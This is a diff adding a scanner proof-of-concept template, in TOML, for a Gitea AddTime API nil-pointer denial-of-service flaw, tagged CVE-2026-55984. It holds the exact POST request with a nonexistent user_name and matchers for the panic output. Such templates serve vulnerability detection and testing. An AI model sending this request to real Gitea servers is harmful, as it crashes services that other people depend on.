@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "向 Gitea API 发送包含不存在 user_name 的 POST 请求，触发空指针解引用导致服务端 panic 拒绝服务。需要仓库管理员权限。"
+id = "POC-AVE-2026-0639"
+name = "Gitea AddTime API 空指针解引用拒绝服务漏洞 PoC"
+severity = "low"
+tags = ["ave-2026-0639"]
+vuln_id = [
+    "CVE-2026-55984",
+    "AVE-2026-0639",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/repos/owner/repo/issues/1/times"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"time":3600,"user_name":"nonexistent_user_xyz"}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "runtime error",
+    "invalid memory address",
+    "nil pointer dereference",
+]
